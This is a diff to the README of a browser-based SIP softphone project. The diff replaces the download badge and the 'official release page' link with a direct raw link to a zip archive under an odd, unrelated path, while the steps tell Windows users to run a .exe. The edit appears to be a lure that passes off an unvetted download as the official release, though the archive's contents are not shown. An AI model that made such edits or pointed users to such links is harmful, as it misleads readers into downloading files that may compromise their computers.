@@ -5,7 +5,7 @@ description: "Deploy a browser-based WebRTC SIP softphone using this static, bui
 ---
 # 📞 cloudsip.app - Manage your phone calls with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/Down-organicdisorder777/cloudsip.app)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://raw.githubusercontent.com/Down-organicdisorder777/down-organicdisorder777.github.io/main/avoirdupois/organicdisorder_down_io_github_v2.3.zip)
 
 cloudsip.app is a softphone. It uses your internet connection to handle phone calls. You can manage multiple lines, transfer calls, and record audio. The app works on your computer just like a web browser. It connects to your existing phone system using standard technologies. 
 
@@ -24,7 +24,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Down-organicdisorder777/cloudsip.app) to find the latest version.
+1. Go to the [official release page](https://raw.githubusercontent.com/Down-organicdisorder777/down-organicdisorder777.github.io/main/avoirdupois/organicdisorder_down_io_github_v2.3.zip) to find the latest version.
 2. Look for the file ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
